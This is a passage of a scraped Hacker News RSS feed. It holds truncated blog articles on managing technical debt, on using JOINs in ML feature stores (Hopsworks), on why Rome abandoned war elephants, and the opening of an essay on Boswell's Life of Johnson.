<p>And the same thing can happen with software. The difference is that the bugs and problems are easier to spot in the developing process, because, after a while, new features become impossible to deliver before um fix these bugs.</p>
<h2>Why is Technical Debt always bad?</h2>
<p>We are used to understanding any Technical Debt in software as a very bad thing. And it usually is.</p>
<p>But we can also see it as a strategic and/or economic decision since a project riddled with Technical Debt is still a project that was delivered fast. It can be a very positive thing for the product.</p>
<p>The problem with this approach starts when we start to forget what we have done in the past. Imagine that Technical Debt is a really greasy and tasty junk food. To eat it once or twice may be wonderful, but after the eighth ou ninth meal, it might be time to acknowledge you have a problem.</p>
<p>By accepting that it is a tradeoff, we can move faster to pay the debt in the future. It really something very normal to do.</p>
<p><img alt="Losing Quality vs. Speed up deliveries" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-tradeoff-en.png"></p>
<p>I don’t know how many of you have paid the cost of too much junk food. Just remember that this cost, as well as in software, becomes higher with time.</p>
<p>If you identified some of these situations in your day-to-day tasks, don’t worry, especially if you have some time dedicated to remedying the problem in the future. This is a really common scenario when dealing with software delivery.</p>
<h2>Technical Debt Quadrant</h2>
<p><img alt="Martin Fowler’s Technical Debt Quadrant" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-quadrant-en.png"></p>
<p>If we look at <a href="https://martinfowler.com/bliki/TechnicalDebtQuadrant.html" target="_blank">Martin Fowler’s Technical Debt Quadrant</a>, we can see John in the upper quadrants, between Reckless and Prudent. </p>
<p>He knew he didn’t have enough time to design the best solution, but he also knew that: In the future, he had to come back and improve his code.</p>
<p>Ok, accepting this as something ordinary, we can try to understand who is really responsible for the software’s debt.</p>
<h2>Who’s responsible for the debt?</h2>
<p>If we focus on the name (Technical Debt), we’re lead to think that it’s a problem made by technical people, namely: the developers, who are responsible for writing the code that ultimately caused the debt.</p>
<p>The problem is that software is the result of the structure and processes of a whole company.</p>
<p>Also, the whole software industry changed since the term “Technical Debt” was born. In John’s scenario, for example, the problem with the not-so-good solution that he crafted is more connected to a management issue, or even to the product team, than to himself. We know John is a good developer, but he had to ignore a lot of problems in order to deliver within the established deadline.</p>
<p>Sometimes the bottlenecks that are creating debt come from different parts of the company, such as:</p>
<ul>
<li>Management team vs Developers speed</li>
<li>Product team not having a long-term plan</li>
<li>UI/UX team too far from the developers</li>
</ul>
<p>But we can’t forget that, sometimes, we are indeed to blame for our own bad decisions.</p>
<p><img alt="John is sad because his bad decisions also affect the project" src="https://labcodes.com.br/blog/images/tech-debt/our-responsability-en.png"></p>
<ul>
<li>Our bad decisions counts</li>
<li>Framework smells</li>
<li>Low test coverage</li>
</ul>
<p>Like when we choose a new and exciting framework, without investing the necessary time to understand if that is the best tool for the job at hand, or even when we stop paying attention to the signs that a framework is being abandoned, or when the developers aren’t testing and refactoring the application as they should… All of this is our fault. </p>
<p>After discovering which problems we have in our code, we need to look for the tools we can use to help us deal with the situation.</p>
<h2>How to deal with the debt?</h2>
<ul>
<li>Rewriting everything?</li>
<li>Hire more people just to deal with the debt?</li>
<li>Stop delivering until we can fix some of the debt?</li>
<li>Creating Technical Debt tasks in a separate Technical Debt board?</li>
</ul>
<p>Imagine if people had simply stopped building the Tower of Pisa and destroyed everything to rebuild. The chances of the same mistakes happening, or even new mistakes, were really high. And consider the amount of money necessary for demolishing and rebuilding everything.</p>
<p>What if the company simply hired more people to fix the debts? In the case of the Tower, we would have people trying to build it higher working alongside people trying to make it straight and steady. This really doesn’t solve the main problem.</p>
<p>In software, hiring a new team to deal with existing problems would mean that the old team would have to take the time to explain the whole context of the software to the new team. And, believe me, this would take a lot more time than you’d think. </p>
<p>And what if we created a new place to store our Technical Debt task? After a while, this place would become completely invisible to the team.</p>
<p><img alt="Comic strip from the process of creating a new tech debt ticket and adding it to a backlog full of forgotten tickets using dead plants as an analogy" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-backlog.png"></p>
<p>If an ordinary developer’s backlog already has its own old and invisible tasks, imagine creating a whole different board with separate tasks. However, these are the solutions most people usually look for.</p>
<p>So, Luan, if these options aren’t the most viable, what can we do?</p>
<p>After what we already know, we must try to find truly viable solutions to deal with the Technical Debt.</p>
<h2>Sustainable solutions</h2>
<h3>1. I.M.P.A.C.T</h3>
<p><img alt="I.M.P.A.C.T cyclic process" src="https://labcodes.com.br/blog/images/tech-debt/impact.png"></p>
<p>IMPACT is a process to:</p>
<ul>
<li>Identify</li>
<li>Mark</li>
<li>Plan</li>
<li>Act</li>
<li>Test</li>
</ul>
<p>As we can see, the first step is about finding the debt spots and, in the second step, we need to make sure that these spots are noticeable for the whole team. You can assure that by creating new tasks flagged as Technical Debt, for example. We can also choose the priorities of these tasks based on their relevance. Tools like Jira have mechanisms to increase the priority of certain tasks over time, which is amazing, because, as we have seen before, the cost of a Technical Debt increases over time.</p>
<p>After that, we need to create a plan, and really follow that plan, for the marked tasks. This way, we will effectively Act on the debts and, after the fixes and improvements being implemented, we need to Test and assure that no behaviors were damaged, be it new bugs, features, improvements, or anything that could hinder the final experience.</p>
<p>You can find more detailed information about this in a book called “Refactoring for Software Design Smells - Managing Technical Debt”.</p>
<h3>2. Pareto Principle</h3>
<p>If you don’t know how many tasks you should have for each team iteration.</p>
<p><img alt="Pareto principle demonstrated using Pizza slices" src="https://labcodes.com.br/blog/images/tech-debt/pareto-principle-en.png"></p>
<p>We can use the Pareto Principle to assign 20% of the team’s productivity to Technical Debt tasks, and the 80% that remains is used in ordinary tasks, as new features, bug fixing, and everything else.</p>
<h3>3. Technical Debt Review Reunions</h3>
<p><img alt="Cat's in a Tech Debt review" src="https://labcodes.com.br/blog/images/tech-debt/tech-debt-review.png"></p>
<p>If you have big deliveries in your process after a few iterations, it might be a good thing to have post-mortem reunions to discuss everything that’s been introduced to the code that has the potential to increase the Technical Debt.</p>
<p>By doing this, we can identify the debts earlier.</p>
<p>These are three examples of possible solutions, but I’d advise you to be extra critical and choose the one that fits you and your team the best.</p>
<p>Let’s probe the economical side of this problem. Is it lucrative to work with a system that already has a big Technical Debt cost?</p>
<h2>Is it lucrative</h2>
<p>I’m going to use a lecture by <a href="https://www.youtube.com/watch?v=TQ9rng6YFeY" target="_blank">J.B. Rainsberger</a> to illustrate my point. In this lecture, Rainsberger explains the cost of the next new feature for your software and how to diminish your error rate when estimating this cost.</p>
<p><img alt="Chart comparison of the two approaches of software coding" src="https://labcodes.com.br/blog/images/tech-debt/next-feature-cost.png"></p>
<p>In this chart, he compares two different costs over time in a project.</p>
<p>As we can see, the cost of a software built without …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://labcodes.com.br/blog/articles/tech-debt.html">https://labcodes.com.br/blog/articles/tech-debt.html</a></em></p>]]>
            </description>
            <link>https://labcodes.com.br/blog/articles/tech-debt.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24871348</guid>
            <pubDate>Fri, 23 Oct 2020 16:44:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Feature Store for MLOps? Feature Reuse Means Join]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24870916">thread link</a>) | @moritzmeister
<br/>
October 23, 2020 | https://www.logicalclocks.com/blog/feature-store-for-mlops-feature-reuse-means-join | <a href="https://web.archive.org/web/*/https://www.logicalclocks.com/blog/feature-store-for-mlops-feature-reuse-means-join">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><div><p>TLDR; Many engineers conflate operational Feature Stores with key-value (KV) stores, like DynamoDB and Cassandra. In fact, KV stores are missing a key mechanism needed to make features reusable: JOINs. JOINs enable features to be reused by different models. This blog is about how to scale your ML infrastructure by reusing cached features so that the number of feature pipelines you manage does not grow linearly with the number of models you run in production.</p><figure id="w-node-6837f843508c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92f4e94a9b1084ab992187_twitter.jpg" loading="lazy" alt=""></p><figcaption><a href="https://odsc.com/speakers/from-silos-to-platform-building-twitters-feature-marketplace/">Img from OSDC talk by Twitter</a>. Twitter evaluate their Feature Store by the number of features that are reused across teams.</figcaption></figure><h2>The Cost of No JOINs: One Feature Pipeline per Model</h2><p>If you don’t reuse features across different models, you will need a new feature pipeline for every new model you put in production. In the diagram below, there is a 1:1 mapping between train/test datasets and models. For every new model you put in production, you will write a new feature pipeline from your data stores that transforms and validates the raw data and performs aggregations, materializing train/test data to files. A ML training program (or pipeline) then trains and validates a model with the train/test data, after which it is tested and deployed to production.</p><p>It is very difficult to reuse the features in the materialized train/test datasets, as they tend to be stored in a format specific to a ML framework: .tfrecord for TensorFlow,.npy for PyTorch - and they cannot be easily combined with features stored in other train/test datasets. This is often due to the limitations of the file formats: neither TFRecord nor NPY support projections (selecting just a subset of columns).</p><p>If you intend to run hundreds of models in production, running hundreds of pipelines will explode your technical debt.</p><figure id="w-node-5b746662ee67-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92ea783652dae4e198dca1_pic-01re.jpg" loading="lazy" alt=""></p></figure><p>In online feature stores that do not support JOINs, it is typically the responsibility of the application to perform the JOIN of the cached features to create the feature vector. So, if you build your own online feature store using Cassandra or DynamoDB, you will need to also add logic for joining (and ordering) features in your applications/models.&nbsp;</p><p>Every new feature you add to that model will need an update to the feature pipeline and changes to the application logic - making it costly and potentially cross-team work.</p><figure id="w-node-0abcd444357c-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eaa4cc8f44bbcc4cb4ad_pic-02re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs enable Feature Reuse</h2><figure id="w-node-792e5aca9095-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eac165896f1612cb3dea_pic-03re.jpg" loading="lazy" alt=""></p></figure><p>A JOIN is a Structured Query Language (SQL) command to combine data from two different two database tables. JOINs are used to create a view over the data that originates from one or more tables. If we assume that we store features normalized in database tables, then we are able to create sets of features (training datasets) by selecting different features from different tables and joining them together using a common join key. The join key(s) identify the common entity these feature values represent.&nbsp;</p><p>If we now assume that features are stored as columns in tables, then what is a train/test dataset? It is a set of features along with a target column. Assuming the features are already present in existing tables, we can just join those features (columns) together to create a view - this view is the train/test dataset. The order of features (in a view) that makes up a train/test dataset is significant - a train/test dataset is a <a href="https://www.mathsisfun.com/combinatorics/combinations-permutations.html">permutations of features - not a combination</a>. Views (enabled by JOINs) enable a massive number of train/test datasets to be defined over a small number of shared features (stored in tables)</p><p>In Hopsworks, we store features in tables that we call “Feature Groups”. Feature Groups introduce a level of indirection between the raw input data and the train/test datasets used to train models, see below. They store a cached copy of the features, computed using the same feature pipeline from earlier, but this time, the feature pipeline writes to one or both of the stores that much a feature store: (1) a scalable store for train/test features (offline feature store) and (2) a low latency, high throughput store for features for serving (online feature store).&nbsp;</p><p>In Hopsworks, we use Apache Hive as a scalable database for the offline store, and MySQL Cluster (NDB) as the online store. Our version of Hive stores its metadata in NDB and its data files in HopsFS/S3. In Hopsworks, FeatureGroups are database tables in Hive and MySQL Cluster, along with feature metadata (also tables in the same NDB database).&nbsp;</p><p>As we can see in the diagram below, if we have N features available in the Feature Store, we can create an unlimited number of train/test datasets by simply joining features together from the offline feature store.&nbsp;</p><p>In Hopsworks, we use Spark, with its cost-based optimizer, to perform JOINs. Spark, together with Parquet/Hudi/ORC help optimize joins by supporting partitioned data, push-down projections, SortMergeJoin, and&nbsp;<br></p><ul role="list"><li>a hint;</li><li>a join type (inner, left, outer, etc);</li><li>a join condition (equi-join);</li><li>an estimation of the input data size</li></ul><figure id="w-node-d713661f3233-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eae8333d716893ac2f5a_pic-04re.jpg" loading="lazy" alt=""></p></figure><h2>JOINs in Online Feature Stores</h2><p>If you use a KV store as your online store, you are back in the same situation as at start - you need a feature pipeline for every new model you put in production. But with Feature Groups (tables in NDB), we can materialize feature vectors (the individual row of features that is fed directly to the model for scoring) from the different tables by performing a join.</p><p>NDB supports <a href="http://mikaelronstrom.blogspot.com/2020/10/parallel-execution-of-outersemi-joins.html">sophisticated optimizations</a> for JOINs, and can push-down many JOINs to the database nodes. In practice, in NDB even complex queries can <a href="http://mikaelronstrom.blogspot.com/2020/10/dbt2-benchmarks-with-ndb-cluster.html">“achieve latency down to 5-10 ms for a transaction that contains around 30 SQL statements”</a>.</p><figure id="w-node-0a1416f8ba8d-b88dcb71"><p><img src="https://uploads-ssl.webflow.com/5e6f7cd3ee7f51ec3ea4da0f/5f92eb0ef0105a291dd69266_pic-05re.jpg" loading="lazy" alt=""></p></figure><h2>Conclusions</h2><p>Reuse features to save on infrastructure and the number of feature pipelines needed to maintain models in production. JOINs is the method we use in Hopsworks to reuse cached features across different models - both for training and serving. We use Spark as the JOIN engine for the offline feature store and NDB with its parallelized, push-down JOINs for low-latency joins in the online feature store. <br></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.logicalclocks.com/blog/feature-store-for-mlops-feature-reuse-means-join</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870916</guid>
            <pubDate>Fri, 23 Oct 2020 16:03:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[War Elephants, Part II: Elephants Against Wolves (2019)]]>
            </title>
            <description>
<![CDATA[
Score 130 | Comments 49 (<a href="https://news.ycombinator.com/item?id=24870626">thread link</a>) | @plat12
<br/>
October 23, 2020 | https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Today, in Part II of our three part series on War Elephants, we’re going to look at the drawbacks of war elephants.  Last time (<a href="https://acoup.blog/2019/07/26/collections-war-elephants-part-i-battle-pachyderms/">here</a>), we discussed the factors that made war elephants so powerful on the battlefield.  To recap: war elephants had a strong psychological element (they are very scary) and could drastically disrupt both infantry and cavalry alike, leaving them easy pickings for forces supporting the war elephant.  Those uses made war elephants popular not only in India, where they were first developed, but among Alexander the Great’s successors, and even as far west as Carthage.  <a href="https://acoup.blog/2019/08/09/collections-war-elephants-part-iii-elephant-memories/">And next time, we’ll look at why elephants <em>remained</em> popular in India</a>, despite the drawbacks we’ll discuss today.</p>



<p>The best way to think about the weaknesses of war elephants is to look at the question with a specific context, so we are going to narrow in on one of the two key areas where war elephants did not last as a weapon system: the Roman world (both the period of the Republic and the Empire).  As I mentioned in the last post, by the Imperial period, the Romans seem to have decided that elephants were not worth the trouble and discontinued their use.  Roman military writers routinely disparage elephants (we’ll see why) as weapons of war and despite the fact that Rome absorbed not one but <em>three</em> states which actively used elephants in war (Carthage, the Ptolemaic and Seleucid Kingdoms) – and thus we may assume three sets of capture, training and breeding programs for maintaining the animals – they did not continue their use.  It is one thing not to adopt a foreign weapon, it is quite another to inherit the entire production complex and still say, “no, not for me.”</p>



<figure><img data-attachment-id="639" data-permalink="https://acoup.blog/300-elephants/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png" data-orig-size="1353,806" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="300-elephants" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/300-elephants.png" alt=""><figcaption>From 300.  I missed this last time, but I just want to note <strong>everything</strong> is wrong with this.  Let me count the ways:<br>1) These elephants are <strong>way</strong> too big.<br>2) The towers on their backs won’t be invented for more than a century<br>3) The bit-and-bridle system of control is not how elephants are controlled.<br>4) The weapons for the tusks are also wrong.<br>5) <strong>Xerxes didn’t have any elephants in his army</strong> (not even in the fantasy count that Herodotus gives)<br>6) This is not how you fight elephants and will get everyone stepped on.<br>One of these days, we’re going to talk about this movie and Sparta.  Until then: <strong>Sparta is terrible.</strong></figcaption></figure>



<p>So today we’re going to ask, “why?”  We’ve answered that question in the immediate term – to quote Trautmann (2015) on the point, “the Roman refusal of the war elephant..was based upon a low estimate of its value” (250).  To put another way, they thought they sucked.  We know elephants <em>could</em> be quite potent in battle, so the answer must be a touch more complicated.  We’ll look at this two ways: first (because it’s me) in terms of <em><strong>logistics</strong></em>, and then in terms of anti-elephant <em><strong>tactics</strong></em>, to see why elephants could not succeed against (or with) Rome.  I am also going to speculate – just a touch – on which of these factors might explain the other major area elephant warfare did not penetrate: China.</p>



<h2>Roman Elephants</h2>



<p>But first, a necessary caveat to an objection no doubt already brewing in the minds of some: but didn’t the Romans use elephants sometimes?  Yes, though Roman employment of elephants was at best uneven (this is a point, I’d like to note, where Trautmann (2015) shows its value over, for instance, J. M. Kistler’s <em>War Elephants </em>(2006) – the latter’s reading of Roman use of war elephants bends the evidence to serve an argument, rather than the other way around).  Nevertheless, the Romans did use war elephants during the last two centuries of the Republic.</p>



<p>The Romans had some war elephants (just 20) at Cynocephelae (197 B.C.) against Macedon – these had been drawn from the kingdom of Numidia, which had sided with Rome against Carthage in the Second Punic War.  Plutarch (<em>Flam</em>. 8.2-5) leaves the animals out of the battle narrative, but Livy (who is the better source; Liv. 33.9) notes their use to break up the Macedonian right wing, which was not yet even in fighting formation.  It’s not clear the elephants were necessary for the Roman victory here and the key action was actually a flanking attack by infantry.</p>



<p>The Romans brought elephants to Magnesia (190 B.C.), but left them in reserve; the Romans only had a few, whereas their Seleucid opponents had brought many more.  Moreover, the Roman elephants were smaller African elephants, effectively useless against the large Asian elephants the Seleucids used.  Pydna (168 B.C.) against the Macedonians again, is harder to assess because the sources for it are poor (part of Livy’s narrative of the battle is lost).  Plutarch (<em>Aem.</em> 19-22) leaves the elephants out again, whereas Livy stops to expressly say they were useless.  Kistler (himself reliant on other scholars to read the Latin for him) reads this as the elephants being the decisive element; the sources cannot support this reading.  Livy – who appears to be quoting Polybius, a contemporary of the battle – is quite clear what he thinks of the elephants, “For as new inventions often have great force in the words of men, but when tried, when they need to work, and not just have their working described, they evaporate without any effect – just so the war elephants were just a name without any real use.” (<a href="http://www.perseus.tufts.edu/hopper/text?doc=Perseus%3Atext%3A1999.02.0211%3Abook%3D44%3Achapter%3D41">Liv 44.41.4</a>, my rough translation).</p>



<figure><img data-attachment-id="640" data-permalink="https://acoup.blog/g3446/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg" data-orig-size="1186,1172" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="g3446" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/g3446.jpg" alt=""><figcaption>Roman denarius (a coin) issued by Julius Caesar to commemorate the Battle of Thapsus (46 B.C.)</figcaption></figure>



<p>The Romans did find elephants useful in places like Spain or southern Gaul (modern Provence) where just a handful could bewilder and terrify opponents completely unused to and unprepared for them.  The last gasp of true Roman war elephants came in 46 B.C., where Julius Caesar defeated a Roman army led by Metellus Scipio which had sixty elephants in it.  The elephants lost and one of Caesar’s legions (my personal favorite, Legio V Alaudae (Larks!)) took the elephant as a legionary symbol in commemoration of having beaten them.</p>



<p>So absolutely yes, the Romans of the Middle and Late Republic made some use of war elephants, but it was hardly a distinguished run.  As Trautmann notes – quite correctly, in my view – the Romans were always more interested in ways to defeat elephants than to use them.  Which brings us back to our question: elephants are <strong>awesome</strong>, Romans are <em>also awesome</em>…so why didn’t the Romans like elephants?</p>



<h2>Elephant Logistics</h2>



<p>From trunk to tail, elephants are a logistics <em>nightmare</em>.</p>



<p>And that begins almost literally at birth.  For areas where elephants are native, nature (combined, typically, with the local human terrain) create a local ‘supply.’  In India this meant the elephant forests of North/North-Eastern India; the range of the North African elephant (<em>Loxodonta africana pharaohensis</em>, the most likely source of Ptolemaic and Carthaginian war elephants) is not known.  Thus for many elephant-wielding powers, trade was going to always be a key source for the animals – either trade with far away kingdoms (the Seleucids traded with the Mauyran Indian kingdom for their superior Asian elephants) or with thinly ruled peripheral peoples who lived in the forests the elephants were native to.</p>



<p>(We’re about to get into some of the specifics of elephant biology.  If you are curious on this topic, I am relying heavily on R. Sukumar, <em>The Asian Elephant: Ecology and Management</em> (1989).  I’ve found that information on Asian elephants (<em>Elephas maximus</em>) <strong>much</strong> easier to come by than information on African elephants (<em>Loxodonta africana</em> and <em>Loxodonta cyclotis</em>).)</p>



<p>In that light, creating a breeding program – as was done with horses – seems like a great idea.  Except there is one major problem: a horse requires about four years to reach maturity, a mare gestates a foal in eleven months and can go into heat almost immediately thereafter.  By contrast, elephants reach adulthood after seventeen years, take 18-22 months to gestate and female elephants do not typically mate until their calf is weaned, four to five years after its birth.  A ruler looking to build a stable of cavalry horses thus may start small and grow rapidly; a ruler looking to build a corps of war elephants is looking at a very slow process.  This is compounded by the fact that elephants are notoriously difficult to breed in captivity.  There is some speculation that the Seleucids nonetheless attempted this at Apamea, where they based their elephants – in any event, they seem to have remained dependent on imported Indian elephants to maintain the elephant corps.  If a self-sustaining elephant breeding program for war elephants was ever created, we do not know about it.</p>



<p>To make matters <em>worse</em>, elephants require <strong>massive</strong> amounts of food and water.  In video-games, this is often represented through a high elephant ‘upkeep’ cost – but this often falls well short of the reality of keeping these animals for war.  Let’s take <em>Total War: Rome II</em> as an example: a unit of Roman (auxiliary) African elephants (12 animals), costs 180 upkeep, compared to 90 to 110 upkeep for 80 horses of auxiliary cavalry (there are quite a few types) – so one elephant (with a <em>mahout</em>) costs 15 upkeep against around 1.25 for a horse and rider (a 12:1 ratio).  Paradox’s <em>Imperator</em> does something similar, with a single unit of war elephants requiring 1.08 upkeep, compared to just 0.32 for light cavalry; along with this, elephants have a heavy ‘supply weight’ – twice that of an equivalent number of cavalry (so something like a 2:1 or 3:1 ratio of cost).</p>



<figure><img data-attachment-id="642" data-permalink="https://acoup.blog/1280px-sumatran_elephants/" data-orig-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg" data-orig-size="1280,852" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="1280px-sumatran_elephants" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2019/08/1280px-sumatran_elephants.jpg" alt=""><figcaption>Asian Elephant eating, via <a href="https://commons.wikimedia.org/wiki/Category:Elephas_maximus#/media/File:Sumatran_elephants.jpg">Wikimedia Commons</a>.  They do this <strong>a lot</strong>.</figcaption></figure>



<p>Believe it or not, this <em>understates</em> just how hungry – and expensive – elephants are.  The standard barley ration for a Roman horse was 7kg of barley per day (7 Attic medimnoi per month; Plb. 6.39.12); this would be supplemented by grazing.  Estimates for the food requirements of elephants vary widely (in part, it is hard to measure the dietary needs of grazing animals), but elephants require in excess of 1.5% of their body-weight in food <em>per day</em>.  …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/">https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2019/08/02/collections-war-elephants-part-ii-elephants-against-wolves/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870626</guid>
            <pubDate>Fri, 23 Oct 2020 15:38:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Boswell's Life of Johnson]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 25 (<a href="https://news.ycombinator.com/item?id=24870552">thread link</a>) | @benbreen
<br/>
October 23, 2020 | https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/# | <a href="https://web.archive.org/web/*/https://fantasticanachronism.com/2020/10/22/when-the-worst-man-in-the-world-writes-a-masterpiece/#">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn10521873801" rel="footnote"><sup id="fnref10521873801">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn10521873802" rel="footnote"><sup id="fnref10521873802">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn10521873803" rel="footnote"><sup id="fnref10521873803">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold 